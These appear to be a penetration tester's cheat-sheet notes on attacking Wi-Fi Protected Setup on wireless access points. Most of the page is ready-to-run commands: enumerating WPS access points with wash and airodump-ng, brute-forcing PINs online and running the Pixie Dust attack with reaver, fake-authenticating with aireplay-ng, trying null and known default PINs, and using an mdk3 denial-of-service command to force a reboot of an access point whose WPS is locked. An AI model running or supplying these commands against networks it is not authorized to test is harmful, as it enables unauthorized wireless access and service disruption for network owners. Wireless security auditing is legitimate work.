### Enumeration
---
Use `wash` to see if there are WPS-enabled APs:
```sh
wash -i wlan0mon
```
- Listing APs with WPS enabled.
- Scans 2.4GHz by default. Add `-5` to also scan 5GHz networks.
- `WPS` indicates the WPS version. WPSv2 is more resilient towards brute force attacks.
- `Lck` indicates if WPS is locked.

Alternatively, use airodump-ng:
```sh
sudo airodump-ng --wps
```

### Exploitation
---
##### PIN Brute force (Online)
###### Reaver:
```sh
sudo reaver -i wlan0mon -b <AP bssid> -v
```

##### Pixie Dust Attack (Offline)
###### Reaver:
```sh
sudo reaver -i wlan0mon -b <AP bssid> -v -K
```
- `-K` for try running PixieWPS attack.

>[!note]
>If reaver is stuck at `Waiting for beacon from XX:XX:XX:XX:XX:XX` for a very long time, add the channel parameter `-c` to specify the channel of the AP.

If the attack is not working because we are not associated with the AP:
```sh
sudo aireplay-ng --fakeauth 30 -a <AP bssid> -h <Our wlan0mon MAC> wlan0mon
```
- When running this, run `reaver` with `-A` to avoid reaver associating with the AP.

### Null PIN Attack
---
Some WPS implementation have blank PIN. We can add `-p` for verifying a single PIN. 
``` sh
sudo reaver -b <bssid> -i wlan0mon -v -p ''
```

### Known PINs + Generation Algorithms
---
Some default PINs depend on the first 3 bytes of the BSSID. Use the `airgeddon` project ([v1s1t0r1sh3r3/airgeddon: This is a multi-use bash script for Linux systems to audit wireless networks. (github.com)](https://github.com/v1s1t0r1sh3r3/airgeddon)).
```sh
sudo apt install airgeddon 
```

Loading the default PINs into memory:
```sh
source /usr/share/airgeddon/known_pins.db
```

Check the database with BSSID starting with `AABBCC`
```sh
echo ${PINDB["AABBCC"]}
```
- Try the output PINs. If all not working, try blank PIN.


### Troubleshooting
---
- Always try another Wi-Fi adapter with another chipset when possible.
- Try restarting Reaver if this message pops up: `[!] WPS transaction failed (code: 0x03), re-trying last pin`


For locked WPS, try rebooting the AP with mdk3/mdk4 ([mdk3 | Kali Linux Tools](https://www.kali.org/tools/mdk3/)), a DoS tool.
```sh
mdk3 wlan0mon a -a <AP bssid> -m
```

